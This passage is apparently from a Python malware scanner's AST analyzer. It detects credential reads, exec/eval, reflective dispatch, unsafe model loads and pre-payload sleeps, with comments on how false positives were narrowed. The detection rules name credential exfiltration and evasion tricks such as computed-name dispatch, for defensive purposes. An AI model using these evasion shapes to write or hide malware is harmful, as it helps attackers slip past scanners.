            return key

        for node in ast.walk(tree):
            if isinstance(node, ast.Subscript):
                # `os.environ["NAME"]`
                key = key_of(node.slice)
                if key is not None and self._dotted(node.value) in ENVIRONMENT:
                    keyed[id(node.value)] = key
            elif isinstance(node, ast.Call):
                key = key_of(node.args[0]) if node.args else None
                if key is None:
                    continue
                if self._dotted(node.func) in ENVIRONMENT:
                    # `os.getenv("NAME")`. Mapped against the function node,
                    # because the walk reaches that as a bare `Attribute` too and
                    # would record it whatever `_call` decided.
                    keyed[id(node.func)] = key
                elif (
                    isinstance(node.func, ast.Attribute)
                    and node.func.attr in {"get", "setdefault", "pop"}
                    and self._dotted(node.func.value) in ENVIRONMENT
                ):
                    # `os.environ.get("NAME")`, and the two methods that read the
                    # same way.
                    keyed[id(node.func.value)] = key
            elif isinstance(node, ast.Compare):
                # `"NAME" in os.environ` asks whether one setting is present and
                # obtains no value at all, so it is a weaker act than any of the
                # keyed reads above. It reached none of them: a `Compare` names no
                # key, registered nothing, and so the bare-`Attribute` branch of
                # the walk saw an unkeyed `os.environ` and called it
                # whole-environment access -- the broadest reading available, for
                # the narrowest act there is.
                #
                # `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ`
                # three times in its `setup.py` and `if "SALT_VERSION" in
                # os.environ` in `salt/version.py`. Both files are install-time by
                # definition and both reach the network, so both were
                # `MALWARE.EXFIL.001` at CRITICAL -- "reads credentials and
                # transmits them" -- for build flags that gate a version string.
                #
                # Judged by the name, like every other keyed read, rather than by
                # a second rule of its own. A presence test on a name that reads
                # as a credential is still worth the label, because code that asks
                # whether a token is set is code that means to use it, and the
                # read itself is its own hit wherever it happens.
                left: ast.expr = node.left
                for op, comparator in zip(node.ops, node.comparators, strict=True):
                    if isinstance(op, ast.In | ast.NotIn) and (
                        self._dotted(comparator) in ENVIRONMENT
                    ):
                        key = self.constant(left)
                        if key is not None:
                            keyed[id(comparator)] = key
                    left = comparator
        for node_id in written:
            # A written name is not a read at all, whatever the name says.
            keyed[node_id] = ""
        return keyed

    def _call(self, node: ast.Call) -> None:
        dotted = self._dotted(node.func)
        if dotted == "open" and node.args:
            self._opened_for_persistence(node)
        if dotted in UNSAFE_LOADERS and self._loads_a_bundled_file(node, dotted):
            self._record(Capability.EXECUTE, node, f"unsafe model load: {dotted}")
        if dotted and dotted in PRIMITIVES:
            if dotted in ENVIRONMENT and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                # `os.getenv("NAME")`, whose key is its first argument. With no
                # literal key the name is computed, and a computed lookup into the
                # environment is the broad access rather than a named setting.
                key = self.constant(node.args[0]) if node.args else None
                if key is not None and not CREDENTIAL_VARIABLE.search(key):
                    return
            if (
                dotted in ("exec", "eval")
                and node.args
                and self._read_from_local_file(node.args[0])
            ):
                # `for l in open("src/pkg/__init__.py"): if l.startswith("Version"): exec(l, D)`
                # -- how reportlab's `setup.py`, and a great many others, read their own version.
                # The text is the package's own file, scanned here as what it is.
                self._excused_lines.add(node.lineno)
                return
            self._record(
                PRIMITIVES[dotted],
                node,
                dotted,
                command=self._command(node),
                fixed=self._fixed_command(node),
            )
            return

        base = dotted.split(".")[-1] if dotted else None
        if base not in REFLECTIVE:
            return

        # `getattr(os, "system")` and friends. The first argument names the
        # namespace, the second the attribute.
        namespace = self._dotted(node.args[0]) if node.args else None
        attribute = self.constant(node.args[1]) if len(node.args) > 1 else None

        if base == "__import__":
            imported = self.constant(node.args[0]) if node.args else None
            first = node.args[0] if node.args else None
            if isinstance(first, ast.Name) and first.id in self._enumerated:
                # Enumerated rather than computed. See `_collect_names`.
                return
            if imported is None and node.args:
                self._dynamic(node, "__import__ with a computed module name")
            return

        if attribute is not None and namespace:
            resolved = f"{namespace}.{attribute}"
            if resolved in PRIMITIVES:
                callsite = self._invoked.get(id(node), node)
                self._record(
                    PRIMITIVES[resolved],
                    node,
                    resolved,
                    command=self._command(callsite),
                    fixed=self._fixed_command(callsite),
                )
                return
        if len(node.args) > 1 and attribute is None and namespace in DANGEROUS_NAMESPACES:
            if len(node.args) > 2 and id(node) not in self._invoked:
                # A DEFAULT, and nothing called. `getattr(x, name, None)` asks whether an
                # attribute exists and is prepared for it not to: the third argument is
                # the caller saying so. `unslothai/unsloth` writes
                # `if getattr(sys, f"__{name}__", None) is None:` to detect its runtime.
                #
                # Both halves are needed. `getattr(os, decode(blob), None)()` has a
                # default and IS dispatch, which is what the invocation test is for.
                return
            self._dynamic(node, f"{base} on {namespace} with a computed name")

    def _subscript(self, node: ast.Subscript) -> None:
        """`__builtins__["ex" + "ec"]` and `globals()["exec"]`."""
        container = self._dotted(node.value)
        if isinstance(node.value, ast.Call):
            inner = self._dotted(node.value.func)
            container = inner.split(".")[-1] if inner else None
        key = self.constant(node.slice)

        if key is not None:
            if key in PRIMITIVES:
                self._record(PRIMITIVES[key], node, key)
            elif container and f"{container}.{key}" in PRIMITIVES:
                self._record(PRIMITIVES[f"{container}.{key}"], node, f"{container}.{key}")
            return

        if isinstance(node.ctx, ast.Store | ast.Del):
            # `globals()[name] = value` WRITES a name; it does not reach one. Re-exporting
            # from a C extension is how PyTorch populates `torch._dynamo`:
            #
            #     globals()[name] = getattr(torch._C._dynamo.eval_frame, name)
            #
            # Thirteen of PyTorch's twenty-five findings were that line and its siblings,
            # and `globals()[metric] += getattr(delta, metric)` is the same idiom
            # accumulating counters. The rule is about reaching a function by a computed
            # name, which is the READ half -- and the `getattr` on the right of these
            # assignments is exactly that, so the file still carries the capability when
            # the name it reads is genuinely computed.
            return

        if container in DANGEROUS_NAMESPACES or container in {"globals", "vars", "locals"}:
            if container in {"globals", "vars", "locals"} and id(node) not in self._invoked:
                # A READ of a module-level name, with nothing called.
                # `NousResearch/hermes-agent` caches a rendered banner as
                # `cached = globals()[cache_name]`, which reaches a VALUE by a computed
                # name -- and this rule is about reaching a FUNCTION by one.
                #
                # Only for the namespace dictionaries. `__builtins__[name]` stays a
                # finding whether it is called here or passed somewhere that will call
                # it, because nothing in `__builtins__` is a value worth fetching by a
                # computed name.
                return
            self._dynamic(node, f"{container}[...] with a computed key")

    # -- Recording -------------------------------------------------------

    def _record(
        self,
        capability: Capability,
        node: ast.AST,
        detail: str,
        command: str | None = None,
        *,
        fixed: bool = False,
    ) -> None:
        keep = command if capability is Capability.SPAWN else None
        self._hits.append(
            AstHit(
                capability=capability,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
                command=keep,
                fixed_command=fixed and capability is Capability.SPAWN,
            )
        )

    def _dynamic(self, node: ast.AST, detail: str) -> None:
        """Reflective dispatch whose target could not be resolved.

        This is the point of the tier rather than a gap in it. An attacker who
        goes dynamic to escape the name match is forced to light this up
        instead, and combined with the decode, egress or credential access that
        malware needs anyway it is a combination with almost no benign
        analogue.
        """
        self._hits.append(
            AstHit(
                capability=Capability.DYNAMIC_DISPATCH,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
            )
        )


SLEEP_CALLS = frozenset({"time.sleep", "asyncio.sleep", "trio.sleep", "anyio.sleep"})
"""The ways Python waits, as a dotted name."""


def loop_delay_lines(source: str) -> frozenset[int]:
    """Lines where a sleep is inside a loop, and so a schedule rather than a delay.

    `CAP.ANTI.DELAY.001` says in its own comment what this is for: a sleep at the top of
    a loop is a heartbeat, the only way to express that in one regex is a lookbehind over
    a fixed indentation, and a pattern that works at eight spaces and fails at four is
    worse than the finding it removes. "Expressing it properly means asking the AST
    whether the sleep is the first statement of a loop, which is a change to the Python
    tier rather than to a pattern." This is that change.

    `unslothai/unsloth` hangs a thread with `while True: time.sleep(3600)` to keep a
    partial download's handle open, and prints a heartbeat with
    `for _ in range(10000): time.sleep(300)`. vLLM's `_report_continuous_usage` is the
    case the comment names.

    Anywhere in the loop body, not only the first statement: a retry loop that sleeps
    after its attempt is the same shape and the same claim. What stays reported is a
    sleep in straight-line code, which is what a delay before a payload is.

    Returns nothing for source that does not parse, which leaves the pattern's answer
    standing -- the safe direction.
    """
    try:
        tree = ast.parse(source)
    except (SyntaxError, ValueError, RecursionError):
        return frozenset()

    analyzer = PythonAnalyzer()
    analyzer._collect_names(tree)
    lines: set[int] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.While | ast.For | ast.AsyncFor):
            continue
        for inner in ast.walk(node):
            if not isinstance(inner, ast.Call):
                continue
            dotted = analyzer._dotted(inner.func)
            if dotted in SLEEP_CALLS or (dotted or "").endswith(".sleep"):
                lines.add(getattr(inner, "lineno", 0))
    return frozenset(lines)


def startup_lines(text: str) -> str:
    """The part of a `.pth` file Python executes: each line beginning `import` (followed by a
    space or tab), which `site` runs with `exec`. Every other line is a directory to add to the
    path, and is blanked rather than dropped so line numbers still point into the file."""
    return "\n".join(
        line if line.startswith(("import ", "import\t")) else "" for line in text.split("\n")
    )


def resolve(source: str) -> Iterator[AstHit]:
    """Capabilities this source resolves to. Convenience over `PythonAnalyzer`."""
    yield from PythonAnalyzer.analyse(source)


__all__ = [
    "PRIMITIVES",
    "SLEEP_CALLS",
    "Assembled",
    "AstHit",
    "PythonAnalyzer",
    "loop_delay_lines",
    "resolve",
    "startup_lines",
]
